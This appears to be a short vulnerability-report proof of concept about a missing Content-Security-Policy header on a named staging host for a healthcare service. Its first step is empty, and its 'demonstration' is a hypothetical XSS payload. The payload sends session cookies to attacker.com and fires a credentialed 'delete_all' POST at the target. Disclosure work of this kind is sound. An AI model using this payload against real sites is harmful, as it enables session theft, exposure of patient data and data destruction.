🔒 Missing Content-Security-Policy Header PoC

Target: https://hipaa.staging.gearset.com

Vulnerability Analysis:

The application lacks CSP headers, making it vulnerable to XSS attacks.

Step 1: Verify Missing CSP Header


        
        
Step 2: Potential XSS Impact

        
Without CSP, if the application has any parameter reflection, attackers could:

        
    
            
  • Steal session cookies
    • 
            
  • Perform actions as authenticated users
    • 
            
  • Access sensitive healthcare data (PHI)
    • 
            
  • Redirect to malicious sites
    • 
        

        
        
Step 3: Demonstration

        
If a vulnerable parameter existed, this payload could execute:

        
<script>
// Steal cookies
var img = new Image();
img.src = 'https://attacker.com/steal?cookie=' + document.cookie;

// Perform malicious actions
fetch('https://hipaa.staging.gearset.com/sensitive-action', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({action: 'delete_all'})
});
</script>
